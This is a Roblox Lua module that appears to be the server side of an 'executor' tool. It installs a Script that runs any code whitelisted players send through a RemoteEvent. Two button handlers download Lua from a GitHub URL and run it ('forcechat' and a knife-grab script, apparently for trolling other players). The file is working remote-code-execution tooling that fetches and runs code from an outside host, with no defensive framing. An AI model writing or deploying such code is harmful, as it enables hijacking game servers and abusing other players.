local module = {}

function module:init(exec, execute2, main, title, buttons, execute, shadow, clear, scriptlist, settingz, exec_2, scripteditor, scriptbox, otherscripts, TextLabel, settings_2, TextLabel_2)
    local player = nil
    local loadstring = require(game:GetService("ReplicatedStorage"):WaitForChild("loadstring", 99999))

	local function SELVO_fake_script()
		local script = Instance.new('Script', exec)
		script.Name = "servercm"
		
		local remotes = {
			execute = script.Parent:WaitForChild("execute", 99999);
		}

		remotes.execute.OnServerEvent:Connect(function(playere, code)
            if player == nil then player = playere end
			local eligible = game:GetService("ReplicatedStorage"):FindFirstChild("returnwhitelistsrv"):Invoke(playere)
			
			if eligible == true then
				loadstring(code)()
			end
		end)
	end
	coroutine.wrap(SELVO_fake_script)()

    local function SDOON_fake_script()
        local script = Instance.new('Script', otherscripts:FindFirstChild("scroll"):FindFirstChild("forcechat"))
        script.Name = "request"

        otherscripts:FindFirstChild("scroll"):FindFirstChild("forcechat").MouseButton1Click:Connect(function()
            local playergui = exec.Parent

            if playergui then
                if playergui:IsA("PlayerGui") then
                    if player == nil then player = exec.Parent.Parent end

                    if not exec.Parent:FindFirstChild("forcechat") then
                        local fcmain = loadstring(game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/fc/u.lua", true))()

		                fcmain.init(player)
                    end
                end
            end
        end)
    end
    coroutine.wrap(SDOON_fake_script)()

	 local function more_fake_script()
        local script = Instance.new('Script', otherscripts:FindFirstChild("scroll"):FindFirstChild("grabknifev4"))
        script.Name = "request"

        otherscripts:FindFirstChild("scroll"):FindFirstChild("grabknifev4").MouseButton1Click:Connect(function()
            local playergui = exec.Parent

            if playergui then
                if playergui:IsA("PlayerGui") then
                    if player == nil then player = exec.Parent.Parent end

                    if not exec.Parent:FindFirstChild("V4Gui") or not exec.Parent:FindFirstChild("MainGui") then
                        local loadstrng = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/HELKLUAGF30MINUTESOFDATA12381/hi/gbv4/u.lua", true)
                        task.wait(5)
                        local grabknifemain = loadstring(loadstrng)()

		                grabknifemain.init(player)
                    end
                end
            end
        end)
    end
    coroutine.wrap(more_fake_script)()
end

return module
